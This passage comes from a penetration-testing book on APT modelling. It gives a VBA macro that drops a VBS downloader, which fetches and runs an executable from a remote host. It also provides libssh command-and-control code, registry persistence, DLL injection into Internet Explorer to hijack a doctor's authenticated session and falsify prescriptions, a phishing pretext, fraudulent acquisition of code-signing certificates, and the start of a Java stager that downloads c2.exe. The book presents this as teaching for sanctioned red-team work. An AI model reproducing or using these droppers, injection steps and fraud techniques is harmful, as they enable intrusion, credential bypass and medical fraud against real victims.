While\nthis will also require the use of the Shell function in VBA, we will be using it\nnot to execute unknown or suspicious code, but for the Windows Scripting\nHost instead, which is an integral part of the operating system. So basically,\nwe need two scripts—one VBA and one VBS—and both will have to be able to\npass through AV undetected. The VBA macro subroutine to do this needs to\nlook roughly like the following:\nSub WritePayload()\nDim PayLoadFile As Integer\nDim FilePath As String\nFilePath = \"C:\\temp\\payload.vbs\"\nPayloadFile = FreeFile\nOpen FilePath For Output As TextFile\nPrint #PayLoadFile, \"VBS Script Line 1\"\nPrint #PayLoadFile, \" VBS Script Line 2\"\nPrint #PayLoadFile, \" VBS Script Line 3\"\nPrint #PayLoadFile, \" VBS Script Line 4\"\nClose PayloadFile\nShell \"wscript c:\\temp\\payload.vbs\"\nEnd Sub\nKeep Code Generic Whenever Possible\nPretty straightforward stuff. Incidentally, the use of the word “payload” here\nis illustrative and should not be emulated. The benefit of keeping the code as\ngeneric as possible also means it will require very little modification if\nattacking an Apple OSX platform rather than Microsoft Windows.\nAs for the VBS itself, insert the following script into the print statements and\nyou have a working attack—again this is contrived for illustrative purposes\nand there are as many ways of doing this as there are coders:\nHTTPDownload \"http://www.wherever.com/files/payload.exe\", \"C:\\temp\"\nSub HTTPDownload( myURL, myPath )\nDim i, objFile, objFSO, objHTTP, strFile, strMsg\nConst ForReading = 1, ForWriting = 2, ForAppending = 8\nSet objFSO = CreateObject( \"Scripting.FileSystemObject\" )\nIf objFSO.FolderExists( myPath ) Then\nstrFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev(\nmyURL, \"/\" ) + 1 ) )\nElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath,\n\"\\\" ) - 1 ) ) Then\nstrFile = myPath\nEnd If\nSet objFile = objFSO.OpenTextFile( strFile, ForWriting, True\n)\nSet objHTTP = CreateObject( \"WinHttp.WinHttpRequest.5.1\" )\nobjHTTP.Open \"GET\", myURL, False\nobjHTTP.Send\nFor i = 1 To LenB( objHTTP.ResponseBody )\nobjFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1\n) ) )\nNext\nobjFile.Close( )\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nWshShell.Run \"c:\\temp\\payload.exe\"\nEnd Sub\nOf course, anyone examining the VBA code is going to determine its intent\nfairly quickly, so I suggest some form of obfuscation for a real-world attack.\nAlso note that this level of complexity is completely unnecessary to download\nand execute an executable. It would be possible to use the shell command to\ncall various tools shipped with Windows to do this in a single command (in\nfact, I'll be doing this later in Chapter 6, in the section entitled, “VBA Redux”),\nbut I wanted an excuse to introduce the idea of using VBA to drop a VBS\nscript.\nCode Obfuscation\nThere are a number of ways to obfuscate code. For the purposes of this\nexercise, we could encode the lines of the payload as Base64 and decode them\nprior to writing them to the target file; this is primitive but again illustrative.\nIn any event, if a macro attack is discovered by a human party rather than AV\nand a serious and competent forensic exercise was conducted to determine the\npurpose of the code, then no amount of obfuscation if going to shield the\nintentions of the code.\nThis code can be further obfuscated (for example with an XOR function); it's\nreally up to you how complex you want to make your code, although I don't\nrecommend commercial solutions that require integrating third-party\nlibraries into a document, as again these will be flagged by AV.\nLet's integrate our stage two payload into our stage one VBA macro and see\nhow it stands up to AV. Again, we use VirusTotal. See Figure 1.7.\nFigure 1.7: A stealthy payload indeed.\nBetter, but what about the VBS payload itself once it touches disk? See Figure\n1.8.\nFigure 1.8: No, Qihoo-360 is not the Holy Grail of AV.\nUh-oh. We've got a hit by Qihoo-360. This is a Chinese virus scanner that\nclaims to have close to half a billion users. No, I'd never heard of it either. It\nflags the code as virus.vbs.gen.33, which is another way of saying if it's a\nVBS file it's going to be declared as hostile by this product. This might be a\nproblem in the highly unlikely event you ever encounter Qihoo-360.\nSo far, we've not included any mechanism for the code actually executing\nwhen our document is opened by the user.\nEnticing Users\nI don't like using the auto-open functions for reasons discussed previously\nand my opinion is that if a user is already invested enough to permit macros\nto run in the first place, then it's not a huge leap of the imagination to\nsuppose they will be prepared to interact with the document in some further\nway. By way of example, with our attack in its current state, it will appear as\nshown in Figure 1.9 to the user when opened in Microsoft Word.\nFigure 1.9: Blank document carrying macro payload.\nNot very enticing is it? A blank document that's asking you to click a button\nwith the words “Security Warning” next to it. Any macro, whether it's been\ncode-signed or not, will contain this exact same message. Users have become\nsomewhat jaded to the potential severity of clicking this button, so we have\ntwo problems left to solve—how to get the user to execute our code and how\nto make the document enticing enough to interact with. The first is technical;\nthe second is a question of social engineering. The latter combined with a\nconvincing email (or other delivery) pretext can be a highly effective attack\nagainst even the most security-aware targets.\nThere are some good books about social engineering out there. Check out\nKevin Mitnick's Art of Deception (Wiley, 2002) or Chris Hadnagy's Social\nEngineering: The Art of Human Hacking (Wiley, 2010).\nLet's start by creating that pretext.\nOne particularly effective means of getting a target to open a document and\nenable macros—even when their hindbrain is screaming at them to stop—is to\nimply that information has been sent to them in error; it's something they\nshouldn't be seeing. Something that would give them an advantage in some\nway or something that would put them at a disadvantage if they ignored it.\nWith address autocomplete in email clients, we've all sent an email in haste to\nthe wrong person and we've all received something not intended for us. It\nhappens all the time. Consider the following email that “should have been\nsent” to Jonathan Cramer in HR but accidentally found its way to Dr.\nJonathan Crane:\nTo: Dr. Jonathan Crane\nFrom: Dr. Harleen Quinzel\nSubject: CONFIDENTIAL: Second round redundancies\nJon,\nAttached is the latest proposed list for redundancies in my team in\nthe intensive treatment department. I'm not happy losing any members\nof staff given our current workload but at least now we have a\nbaseline for discussion – I'll be on campus on Friday so please\nrevert back to me by then.\nRegards,\nHarley\np.s. The document is secured as per hospital guidelines. When you're\nprompted for it the password is 'arkham'.\nThis is a particularly vicious pretext. Dr. Crane is now probably wondering if\nhe's on that list for redundancies.\nAttached to this email is our macro-carrying document, as shown in Figure\n1.10.\nFigure 1.10: A little more convincing.\nNow we want to add a text box and button to the document that will appear\nwhen the target enables macros. We want to tie our VBS dropper code to the\nbutton so that it is executed when pressed, regardless of what the user types\nin the text box. A message box will then appear informing the target that the\npassword is incorrect, again regardless of what was entered.\nAn additional advantage of the approach of this attack is that (assuming there\nare no additional indicators such as AV alerts) the target is unlikely to raise\nthe alarm either to the sender, or to IT, because they weren't supposed to see\nthis document in the first place, were they?\nTo assign a command or macro to a button and insert that button in your text,\nposition the insertion point where you want the button to appear and then\nfollow these steps:\n1. Press Ctrl+F9 to insert a field.\n2. Between the field brackets, type MacroButton, then the name of the\ncommand or macro you want the button to execute.\n3. Type the text you want displayed, or insert a graphic to be used as a\nbutton.\n4. Press F9 to update the field display.\nAt the end of the WritePayload() subroutine, you might want to consider\nadding the following line:\nMsgBox \"Incorrect password. IT security will be notified following\nfurther violations by \" &\n(Environ$(\"Username\"))\nThis will generate a popup message box masquerading as a security alert that\nincludes the username of the currently logged in user. It's this personalized\napproach that makes the difference between success and failure when\ndelivering your initial payload.\nCommand and Control Part 1: Basics and Essentials\nHaving determined the means by which we intend to deliver our payload, it is\ntime to give serious thought as to what that payload should be. In this section,\nwe will look at the bare bones essentials of what is needed in a Command and\nControl (C2) infrastructure. Each chapter we will revisit, refine, and add\nfunctionality in order to illustrate the necessary or desirable elements that\nmake up the core of long-term APT technology once initial penetration of the\ntarget has occurred. However, in this chapter, we cover the basics, so let's\ndefine the bare minimum of what such a system should be capable of once\ndeployed:\nEgress connectivity—The ability to initiate connections back out to our C2\nserver over the Internet in such a way that minimizes the possibility of\nfirewall interference.\nStealth—Avoidance of detection both by host or network-based Intrusion\nDetection Systems (IDS).\nRemote file system access—Being able to copy files to and from the\ncompromised machine.\nRemote command execution—Being able to execute code or commands on\nthe compromised machine.\nSecure communications—All traffic between the compromised host and\nthe C2 server needs to be encrypted to a high industry standard.\nPersistence—The payload needs to survive reboots.\nPort forwarding—We will want to be able to redirect traffic bi-\ndirectionally via the compromised host.\nControl thread—Ensuring connections are reestablished back to the C2\nserver in the event of a network outage or other exceptional situation.\nThe quickest, easiest, and most illustrative means of building such a modular\nand future-proof infrastructure is the use of the secure and incredibly\nversatile SSH protocol. Such an infrastructure will be divided into two parts—\nthe C2 server and the payload itself—each with the following technical\nrequirements.\nC2 Server\nSSH serving running on TCP port 443\nChroot jail to contain the SSH server\nModified SSH configuration to permit remotely forwarded tunnels\nPayload\nImplementation of SSH server on non-standard TCP port\nImplementation of SSH client permitting connections back to C2 server\nImplementation of SSH tunnels (both local and dynamic) over the SSH\nclient permitting C2 access to target file system and processes\nTo implement the requirements for the payload, I strongly advocate using the\nlibssh library (https://www.libssh.org/) for the C programming language.\nThis will allow you to create very tight code and gives superb flexibility. This\nlibrary will also dramatically reduce your software development time. As\nlibssh is supported on a number of platforms, you will be able to create\npayloads for Windows, OSX, Linux, or Unix with a minimum of code\nmodification. To give an example of how quick and easy libssh is to use, the\nfollowing code will implement an SSH server running on TCP port 900. The\ncode is sufficient to establish an authenticated SSH client session (using a\nusername and password rather than a public key):\n#include <libssh/libssh.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <windows.h>\nint main()\n{\nssh_session my_ssh_session;\nint rc;\nchar *password;\nmy_ssh_session = ssh_new();\nif (my_ssh_session == NULL)\nexit(-1);\nssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, \"c2host\");\nssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, 443);\nssh_options_set(my_ssh_session, SSH_OPTIONS_USER, \"c2user\");\nrc = ssh_connect(my_ssh_session);\nif (verify_knownhost(my_ssh_session) < 0)\n{\nssh_disconnect(my_ssh_session);\nssh_free(my_ssh_session);\nexit(-1);\n}\npassword = (\"Password\");\nrc = ssh_userauth_password(my_ssh_session, NULL, password);\nssh_disconnect(my_ssh_session);\nssh_free(my_ssh_session);\n}\nWhile this code creates an extremely simple SSH server instance:\n#include \"config.h\"\n#include <libssh/libssh.h>\n#include <libssh/server.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <windows.h>\nstatic int auth_password(char *user, char *password){\nif(strcmp(user,\"c2payload\"))\nreturn 0;\nif(strcmp(password,\"c2payload\"))\nreturn 0;\nreturn 1; }\nssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, 900)\nreturn 0\n} int main(){\nsshbind=ssh_bind_new();\nsession=ssh_new();\nssh_disconnect(session);\nssh_bind_free(sshbind);\nssh_finalize();\nreturn 0;\n}\nFinally, a reverse tunnel can be created as follows:\nrc = ssh_channel_listen_forward(session, NULL, 1080, NULL);\nchannel = ssh_channel_accept_forward(session, 200, &port);\nThere are exception handling routines built into the libssh library to monitor\nthe health of the connectivity.\nThe only functionality described here that's not already covered is persistence.\nThere are many different ways to make your payload go persistent in\nMicrosoft Windows and we'll cover that in the next chapter. For now we'll go\nthe simple illustrative route. I don't recommend this approach in real-world\nengagements, as it's pretty much zero stealth. Executed from C:\nchar command[100];\nstrcpy( command, \" reg.exe add\n\"HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n/v \"Innoce\n\" );\nsystem(command);\nA picture paints a thousand words, as you can see in Figure 1.11.\nFigure 1.11: Initial basic Command and Control infrastructure.\nOnce we have a remote forward port, we have as complete access to the\ncompromised host as the user process that initiated the VBA macro. We can\nuse SFTP over the SSH protocol for file system access. In order for the\npayload to initiate remote tunnels, the following lines should be added to the\n/etc/ssh/sshd.config file on the C2 host:\nMatch User c2user\nGatewayPorts yes\nThis setup has significant shortfalls; it requires a constant connection\nbetween the payload and the C2, which can only handle one connection\n(remote tunnel) and therefore one compromised host at a time. There is no\nautonomy or intelligence built into the payload to handle even slightly\nunusual situations such as needing to tunnel out through a proxy server.\nHowever, by the end of the book, our C2 infrastructure will be svelte,\nintelligent, stealthy, and very flexible.\nThe Attack\nWe've looked at ways of constructing and delivering a payload that will give an\nattacker remote access to a target's workstation, albeit in a limited and\nprimitive manner. However, our initial goal remains the same, and that is to\nuse this access to add or modify patient records with a focus on drug\nprescriptions.\nTo reiterate, our target is running Microsoft's Internet Explorer browser (IE)\nand using it to access the Pharmattix web application. No other browser is\nsupported by the company. We could deploy a key logger and capture the\ndoctor's access credentials but this doesn't solve the problem of the two-factor\nauthentication. The username and password are only part of the problem,\nbecause a smartcard is also required to access the medical database and must\nbe presented when logging in. We could wait outside the clinic, mug the\ndoctor, and steal his or her wallet (the smartcards are conveniently wallet\nsized), but such an approach would not go unnoticed and, for modeling an\nAPT, the client would likely disapprove.\nBypassing Authentication\nWhat if we could bypass all authentication mechanisms entirely? We can!\nThis technique is called browser pivoting—essentially, we use our access to\nthe target workstation to inherit permissions from the doctor's browser and\ntransparently exploit his or her permissions to do exactly what we want.\nTo accomplish this attack, we need to be able to do three things:\nInject code into the IE process accessing the medical database.\nCreate a web proxy Dynamic Link Library (DLL) based on the Microsoft\nWinInet API.\nPass web traffic through our SSH tunnel and the newly created proxy.\nLet's look at all three stages. None of them is as complex as they might\ninitially appear.\nStage 1: DLL Injection\nDLL injection is the process of inserting code into an existing (running)\nprocess (program). The easiest way to do this is to use the LoadLibraryA()\nfunction in kernel32.dll. This call will pretty much take care of the entire\nworkflow in that it will insert and execute our DLL for us. The problem is that\nthis function will register our DLL with the target process, which is a big\nantivirus no-no (particularly in a well monitored process such as Internet\nExplorer). There are other, better ways we can do this. Essentially it breaks\ndown into four steps:\n1. Attach to the target process (in this case Internet Explorer).\n2. Allocate memory within the target process.\n3. Copy the DLL into the target process memory and calculate an appropriate\nmemory addresses.\n4. Instruct the target process to execute your DLL.\nEach of these steps is well documented within the Windows API.\nAttaching to a Process\nhHandle = OpenProcess( PROCESS_CREATE_THREAD |\nPROCESS_QUERY_INFORMATION |\nAllocating Memory\nPROCESS_VM_OPERATION |\nPROCESS_VM_WRITE |\nPROCESS_VM_READ,\nFALSE,\nprocID );\nAllocating Memory\nGetFullPathName(TEXT(\"proxy.dll\"),\nBUFSIZE,\ndllPath,\nNULL);\nhFile = CreateFileA( dllPath,\nGENERIC_READ,\n0,\nNULL,\nOPEN_EXISTING,\nFILE_ATTRIBUTE_NORMAL,\nNULL );\ndllFileLength = GetFileSize( hFile,\nNULL );\nremoteDllAddr = VirtualAllocEx( hProcess,\nNULL,\ndllFileLength,\nMEM_RESERVE|MEM_COMMIT,\nPAGE_EXECUTE_READWRITE );\nInsert the DLL and Determine the Memory Address\nlpBuffer = HeapAlloc( GetProcessHeap(),\n0,\ndllFileLength);\nReadFile( hFile,\nlpBuffer,\ndllFileLength,\n&dwBytesRead,\nNULL );\nWriteProcessMemory( hProcess,\nlpRemoteLibraryBuffer,\nlpBuffer,\ndllFileLength,\nNULL );\ndwReflectiveLoaderOffset =\nGetReflectiveLoaderOffset(lpWriteBuff);\nExecute the Proxy DLL Code\nrThread = CreateRemoteThread(hTargetProcHandle, NULL, 0,\nlpStartExecAddr, lpExecParam, 0, NULL);\nWaitForSingleObject(rThread, INFINITE);\nI suggest you become familiar with these API calls, as understanding how to\nmigrate code between processes is a core skill in APT modeling and there are\nmany reasons why we might we want to do this, including to bypass process\nwhitelisting, for example, or to migrate an attack into a different architecture\nor even to elevate our privileges in some way. For instance, should we want to\nsteal Windows login credentials, we would inject our key logger into the\nWinLogon process. We'll look at similar approaches on UNIX-based systems\nlater. In any event, there are a number of existing working attacks to perform\nprocess injection if you don't want to create your own. This functionality is\nseamlessly integrated into the Metasploit framework, the pros and cons of\nwhich we will examine in future chapters.\nStage 2: Creating a Proxy DLL Based on the WinInet API\nNow that we know what we have to do to get code inside the IE process, what\nare we going to put there and why?\nInternet Explorer uses the WinInet API exclusively to handle all of its\ncommunications tasks. This is not surprising given that both are core\nMicrosoft technologies. Any program may use the WinInet API and it's\ncapable of performing tasks such as cookie and session management,\nauthentication, and so on. Essentially, it has all the functionality you would\nneed to implement a web browser or related technology such as an HTTP\nproxy. Because WinInet transparently manages authentication on a per\nprocess basis, if we can inject our own proxy server into our target's IE\nprocess and route our web traffic through it, then we can inherit their\napplication session states. This includes those authenticated with two-factor\nauthentication.\nIMPLEMENTING PROXY SERVER FUNCTIONALITY\nBuilding a proxy server is beyond the scope of this work; however, there\nare third parties that sell commercial proxy libraries for developers. They\nare implemented solely using the WinInet API that can be integrated\naccording to your needs.\nStage 3: Using the Injected Proxy Server\nAssuming that the proceeding steps went according to plan, we now have an\nHTTP proxy server running on our target machine (we'll say TCP port 1234)\nand restricted to the local Ethernet interface. Given that our Command and\nControl infrastructure is not sufficiently advanced to open remote tunnels on\nthe fly, we will need to hardcode an additional tunnel into our payload. At\npresent, the only tunnel back into the target workstation is for accessing the\nSSH server. We need to add a remote tunnel that points to 1234 on the target\nand creates an endpoint (we'll say TCP port 4321) on our C2 server. This will\nlook something like Figure 1.12.\nFigure 1.12: The completed attack with complete access to the medical\nrecords.\nAt this point, we can add new patients and prescribe them whatever they\nwant. No ID is required when picking meds up from the pharmacy, as ID is\nsupposed to be shown when creating an account. Of course, this is just a tick\nbox as far as the database is concerned. All we'll be asked when we go to pick\nup our methadone is our date of birth.\n“There is no cloud, it's just someone else's computer.”\n—Unknown\nSummary\nIn this chapter, you learned how to use VBA and VBS to drop a Command and\nControl payload. With that payload in place, you've seen how it is possible to\ninfiltrate the Internet Explorer process and subvert two-factor authentication\nwithout the need for usernames, passwords, or physical access tokens.\nIt's important to note that a lot of people think that Macro attacks are some\nkind of scourge of the ’90s that just sort of went away. The truth is they never\nwent away, but for a long time there were just easier ways of getting malware\non to a target's computer (like Adobe Flash for example). As such attacks\nbecome less and less viable, the Office Macro has seen a resurgence in\npopularity.\nWhat are the takeaways from this chapter? Firstly, Macros—how many times\nhave you seen one that you really needed to do your job? If someone seems\nlike they're going all out to get you to click that enable button, it's probably\nsuspect. It's probably suspect anyway. A return email address is no indicator\nof the identity of the sender.\nTwo-factor authentication raises the bar but it's not going to protect from a\ndetermined attacker; regardless of the nature of the second factor (i.e.,\nsmartcard or SMS message), the result is the same as if simple single-factor\nauthentication was used: a stateless HTTP session is created that can be\nsubverted through cookie theft or a man-in-the-browser attack. Defense in\ndepth is essential.\nEverything so far has been contrived and straightforward in order to make\nconcepts as illustrative as possible. Moving forward, things are going to get\nprogressively more complex as we explore new attacks and possibilities. From\nnow on, we will concentrate on maximum stealth without compromise—the\nhallmark of a successful APT.\nIn the next chapter, the C2 infrastructure will get more advanced and more\nrealistic and we'll look at how Java applets can be a stealthy means of staging\npayloads.\nExercises\nIt's been necessary to cover a lot of ground in this chapter using technologies\nyou may not be familiar with. I suggest working through the following\nexercises to gain confidence with the concepts, though doing so is not a\nprerequisite for proceeding to the next chapter.\n1. Implement the C2 infrastructure as described in this chapter using C and\nlibssh. Alternatively, use whatever programming language and libraries\nyou are familiar with.\n2. Implement a C2 dropper in VBS that downloads a custom payload as\nshellcode rather than as an .exe and injects it directly into memory. Use\nthe API calls from the initial VBA script.\n3. Assuming your payload had to be deployed as shellcode within a VBA\nscript, how would you obfuscate it, feed it into memory one byte at a time,\nand execute it? Use VirusTotal and other resources to see how AV engines\nreact to these techniques.\nChapter 2\nStealing Research\nThis chapter continues to build on the core concepts investigated in Chapter 1,\n“Payload Delivery and Command and Control.” In doing so, it presents a very\ndifferent environment and a very different target concept.\nUniversities have long been considered “soft” targets for attackers and rightly\nso. Very few colleges have the budget to develop and maintain a coherent\nsecurity strategy. Creating a collaborative academic environment is in a sense\nan anathema to implementing information security at any level. Colleges can\nhave vast sprawling networks containing many different operating systems\nand technologies. There is often no effective central authority for security and\nthe overall infrastructure will have evolved over years with considerable\nreliance on legacy systems. The painful truth is that at some point you\nbecome too big to survive.\nWHY STUDY WHEN YOU CAN STEAL A DEGREE?\nThere are other reasons that top-tier educational environments might be\ntargeted. Some years ago, I was the lead forensic investigator performing\nan incident response exercise at one of the most prestigious colleges in\nthe world. The institution believed (correctly) that their student records\nsystem had been breached. The compromise resulted in one graduate's\nscripts being altered to reflect the details of the attacker, name, date of\nbirth, and so forth. However, the student number wasn't changed as this\nwould have broken the database's indexing. The attacker then contacted\nthe college and asked for a copy of “his” degree, a Bachelor of Science in\nBiology, stating that the original had been lost in a fire. These things\nhappen, he paid the replacement fee and received a copy of the degree in\nhis name. It takes a special kind of nerve to pull something like that off\nand he nearly got away with it. Through sheer dumb bad luck, he used\n“his” degree to apply for a post-graduate course in marine biology (his\npassion apparently) at another college, but unfortunately for him, his\nvictim had applied there himself the year before. Transcripts were\nrequested (which contain, among other things, student numbers) and\nthings didn't add up. At first the victim himself was accused of fraud, but\nas it turns out, there are a lot more records of you at college than simply\nyour academic achievements—housing and finances, for example. Also,\nthere was the simple fact that no other students or lecturers had ever\nheard of the guy. Not surprisingly, the deception didn't stand up to careful\nanalysis. What is also not surprising is that this stayed out of the news.\nNot the weirdest assignment I've ever worked on, but it's up there.\nBackground and Mission Briefing\nA large and prestigious university in the UK had been awarded a license from\nthe home office to conduct research into human brain perfusion on behalf of\nthe British Army. This is a controversial area of study, as its goal is to keep\nhuman brains alive and functioning outside of the body. If you're a member of\nthe armed forces and wondering where they get live brains from, I suggest\nyou read your contract very carefully. The research itself was not technically\nclassified—the home office license was a matter of public record—but data\nsecurity was a paramount feature of the project not because of the\ncontroversy but because such information would be considered equally useful\nto an enemy state. A penetration test was commissioned and it ended up on\nmy desk. The timeframe for the attack was two weeks and the scope was as\nopen as was legally possible. The dean of the university himself attended the\nscoping meeting as did a cadre of army officers.\nThe university's external IP range was a /16 with thousands of occupied\naddresses and hundreds of web applications. Fortunately, this was not the\nfocus of the exercise. The interested parties wanted to know, all things being\nequal, how quickly the core network could be accessed by an attacker and\nwhat further leverage could be gained with regard to accessing systems within\nthe medical research division. Anyone with access to university assets (other\nthan students) could legitimately be considered a target—this was signed off\nby the dean himself.\nGiven the short time frame, I decided to go with a large-scale “smash and\ngrab” operation. That is, to target a lot of users at once and hope enough mud\nwould stick to the wall when attacking them. Identifying potentially\nappropriate targets would mean creating (at a minimum) a list of names,\ndepartments, and email addresses.\nThe criteria for a potential target would be:\nA member of faculty for presumed elevated privileges to certain internal\ndatabases.\nAn academic in a field not related to computing in any way—the final\nchoice came down to anthropology, archaeology, and social sciences. These\ntargets would allow us to attempt access from outside the medical\nresearch environment.\nMedical research team members themselves.\nUSE EXISTING FRAMEWORKS TO DO THE HEAVY\nLIFTING\nIf you're building a large target list, you might want to consider writing a\nweb scraping script to do the heavy lifting. I highly recommend the\nSelenium framework, which you can find here:\nhttp://www.seleniumhq.org/\nThis is an awesome set of free tools for web application testing that can\nexport scripted tasks to anything from Python to C# code to allow for\nfinely grained automation.\nFor this attack, with just a couple of hundred email addresses to compile, we'll\ngo the manual route and get to know the targets a little. Proceeding with an\nemail attack vector, you must now decide how you will gain initial intrusion\ninto the target network. A VBA macro, as per the first chapter, would be a little\nclumsy for a larger scale attack such as this and that also requires Microsoft\nOffice to be installed. In an academic environment it's likely users will have a\nmuch more disparate set of tools as well as a reliance on operating systems\nother than Microsoft Windows. This presents an interesting challenge—how\ncan you deploy a stager payload that will run in any environment and, based\non what it discovers, download and install the appropriate command and\ncontrol infrastructure? The answer is to use Java.\nPayload Delivery Part 2: Using the Java Applet for\nPayload Delivery\nThere are a number of Java exploits and attacks floating around in the wild.\nForget them. You want to code your own tools from the ground up that will\nlook as legitimate as possible and be able to punch through any host-based\nmalware detection and intrusion detection traffic analysis.\nThe attack flow is as follows:\nDevelop a Java applet and deploy it within a convincing web-based\nenvironment. More on that shortly.\nDeploy a social engineering attack against the previously identified users\nto encourage them to visit this website.\nUpon execution, the applet must determine whether it's in a Windows,\nOSX, or Linux environment and download the appropriate C2 agent. This\nwill obviously involve some recoding of the C2, but it's in the C language\nso this should be minimal.\nJava is not a difficult language to learn, so don't worry if you're not familiar\nwith it. I include everything you need, including code, to get you started.\nJava Code Signing for Fun and Profit\nBefore I go any further, it's worth mentioning that since Java 8 Update 20, no\nJava applets will run unless the code is signed by a recognized authority. Code\nsigning was something that probably sounded like a good idea back in the 90s\nwhen the process of acquiring a signing certificate was much harder—you\nneeded a Dunn and Bradstreet number, an incorporated company, and a\nverified mailing address. These days the code signing business is, well, big\nbusiness. It's very competitive and they want your trade so they'll still do a\nlittle verification that you are who you say you are, but it will be the bare\nminimum. You can easily get a certification with a little social engineering. A\nmajor retailer of code-signing certificates states the following on their\nwebsite:\n1. The legal existence of the organization or individual named in the\nOrganization field of the code-signing certificate must be verified.\n2. The email to which the code-signing certificate is to be sent must be\nsomeone@domain.com, where domain.com is owned by the organization\nnamed in the code-signing certificate.\n3. A callback must be made to a verified telephone number for the\norganization or individual named in the code-signing certificate in order to\nverify that the person placing the order is an authorized representative of\nthe organization.\nThis procedure can be used to easily get a code-signing certificate:\nRegister a domain name that is similar to an existing business. Consider\nyour target organization—what might be relevant?\nClone and host that website using the following command:\nwget -U \"Mozilla/5.0 (X11; U; Linux; en-US; rv:1.9.1.16)\nGecko/20110929 Firefox/3.5.16\" --recursive --level=1 --no-clobber\n--page-requisites --html-extension --convert-links --no-parent --\nwait=3 --random-wait http://www.example.com/docs/interesting-part/\n--domains=www.example.com\nChange all phone contact information in the cloned site to point to you.\nConsider a company well outside of the code signer's normal business area\nto discourage chamber of commerce lookups (in practice these are rarely\nperformed).\nI've been able to acquire code-signing certs with only a plausible sounding\nemail address and a cell phone. Remember, you're the client and they want\nyour money.\nOf course, as you're legitimately performing APT modeling, you could use\nyour own legal entity. It's up to you.\nIn a sense, enforcing code signing is the best thing that could have happened\nfor Java malware authors, as it enforces a completely unrealistic security\nmodel that lulls users into a false sense of security. Code signing basically\nworks like this—you the user are trusting a third party you've never met (the\ncode author) because another third party you've never met (the code signer)\nhas said the code (that they've never seen) is safe to run.\nRight.\nOf course, the initial point was to ensure that all code was traceable but that's\nsomething that's been well and truly lost on the way.\nThe basic technique we're illustrating here is one that is heavily favored by\nNSA/GCHQ network infiltration teams or so-called Tailored Access\nOperations and for a reason: it's easy and it works. You don't need a portfolio\nof zero-day exploits to gain access to secure environments when people are\nrunning Java, which is almost universally deployed.\nWith all that in mind, let's get down to some Java coding. First of all,\ndownload the Java SE JDK (not JRE) from the Oracle website. For reasons\nthat escape me, the Java installer never correctly sets the path variable, so\nyou'll need to do that yourself (modify this for the version):\nset path=%path%;C:\\Program Files\\Java\\jdk1.8.0_73\\bin\nYou don't want to have to keep signing every build of your test code; that's\ngoing to get tedious very quickly. You'll need to do the following to set up your\ndevelopment environment. Add your local machine as an exception to the\ncode-signing rule, as shown in Figure 2.1.\nFigure 2.1: Permit all local Java code to run in the browser.\nJava code starts off in plain text files with a .java extension that are then\ncompiled into .class files. Class files can't be signed so they need to be\nbundled into .jar archives for your purposes. The following is an illustrative\nsimple HelloWorld example:\npublic class HelloWorld\n{\npublic static void main(String[] args)\n{\nSystem.out.println(\"Hello, World!\");\n}\n}\nSave this as HelloWorld.java and compile it like so:\njavac HelloWorld.java\nThis will create HelloWorld.class, which is run like so:\njava HelloWorld\nThis runs the Java interpreter. You should see the program output:\nHello, World!\nThis is all well and good, but you want your code to run inside a web browser.\nThe code then needs to be slightly different to inherit certain functionality it\nneeds to run as an applet:\nimport java.applet.Applet;\nimport java.awt.Graphics;\npublic class HelloWorld extends Applet {\npublic void paint(Graphics g) {\ng.drawString(\"Hello world!\", 50, 25);\n}\n}\nCreate a small HTML file in the same directory with the following code:\n<HTML>\n<HEAD>\n<TITLE> A Simple Program </TITLE>\n</HEAD>\n<BODY>\nHere is the output of my program:\n<APPLET CODE=\"HelloWorld.class\" WIDTH=150 HEIGHT=25>\n</APPLET>\n</BODY>\n</HTML>\nSave this file as test.html and load it into your browser, as shown in Figure\n2.2.\nFigure 2.2: Java applet running in the browser.\nAs previously stated, at some point you will need to bundle the .class file\ninto a .jar archive so that it can be code signed. That's easily achieved and\nyou need to modify your HTML code slightly as well:\njar cf helloworld.jar HelloWorld.class\nand\n<HTML>\n<HEAD>\n<TITLE> A Simple Program </TITLE>\n</HEAD>\n<BODY>\nHere is the output of my program:\n<applet code=HelloWorld.class\narchive=\"helloworld.jar\"\nwidth=120 height=120>\n</applet>\n</BODY>\n</HTML>\nSimplicity itself.\nWriting a Java Applet Stager\nIn essence, what you want to do is not a million miles away from the goal of\nthe previous chapter—download and execute a C2 payload. However, this time\nyou are going to assume the existence of three potential operating systems,\nWindows, Apple OSX, and the many Linux derivatives. This will require some\ndiscrimination on the part of the stager and some recoding of the C2 payload\nitself (mainly file path nomenclature and persistence), but all three platforms\nsupport C and libssh, so this is trivial. You will heavily modify the C2 server\nmodel as well for this test to add other much needed functionality.\nCompile the following code:\npublic class OsDetect\n{\npublic static void main(String[] args)\n{\nSystem.out.println(System.getProperty(\"os.name\"));\n}\n}\nThe output reveals the current OS. For example:\nWindows 7\nYou can use various functions to determine all manner of properties of the\nJava Virtual Machine that we've found ourselves in and other useful\ninformation about the host, but right now the OS is adequate for your needs.\nAs far as Windows goes, I generally don't concern myself with targeting x86 or\nx64 platforms individually for payload delivery; x86 works fine for pretty\nmuch everything you want to do. There are, however, good reasons for taking\nthis into consideration when you're doing very specific x64 process\nexploitation or migration, but that doesn't concern us here.\nMoving forward, let's create a stager as a command-line tool for testing\npurposes. Later we'll package it into an applet and make it attack ready. See\nListing 2-1. This code imports the necessary libraries for network\ncommunication, checks out what OS the target is running and downloads the\nappropriate C2. This is intentionally simple for illustrative purposes. This\ncode will run “out of the box” so play around with it and make it better.\nListing 2-1: A Template for a Basic Java Stager\nimport java.io.BufferedInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\npublic class JavaStager {\nprivate static String OS =\nSystem.getProperty(\"os.name\").toLowerCase();\npublic static void main(String[] args) {\nif (isWindows()) {\ntry {\nString fileName = \"c2.exe\";\nURL link = new URL(\"http://yourc2url.com/c2.exe\");\nInputStream in = 